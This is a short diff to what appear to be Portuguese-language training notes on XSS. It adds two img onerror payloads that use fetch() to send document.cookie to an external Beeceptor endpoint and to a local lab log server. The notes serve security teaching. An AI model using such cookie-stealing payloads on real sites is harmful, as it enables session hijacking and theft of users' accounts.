@@ -6,6 +6,14 @@
     ```html
     <img src="a" onerror="alert(1)" />busca
     ```
+    - Enviar cookie Beeceptor (Externo)
+    ```sh
+    yea<img src="a" onerror="fetch('https://teste-crescer-cwi.free.beeceptor.com?cookie'%2bdocument.cookie)" />
+    ```
+    - Enviar cookie Log Server (Local)
+    ```
+    <img src="a" onerror="fetch('https://log.crescer.lab?cookie='%2Bdocument.cookie)" >
+    ```
 - Stored
     - Comentários dos posts
     ```html
